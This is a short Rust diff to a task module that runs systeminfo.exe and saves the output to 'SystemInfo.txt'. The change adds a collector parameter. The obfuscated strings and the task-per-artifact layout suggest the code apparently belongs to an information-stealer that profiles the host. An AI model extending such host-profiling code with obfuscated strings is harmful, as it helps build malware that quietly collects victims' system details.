@@ -1,15 +1,17 @@
 use crate::alloc::borrow::ToOwned;
 use alloc::string::String;
+use collector::atomic::AtomicCollector;
+use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
 use utils::process;
-use obfstr::obfstr as s;
+
 pub(super) struct SystemInfoTask;
 
 impl Task for SystemInfoTask {
     parent_name!("SystemInfo.txt");
     
-    unsafe fn run(&self, parent: &Path) {
+    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
         let system = Path::system();
         
         let res = process::run_file(&(system / s!("systeminfo.exe")));
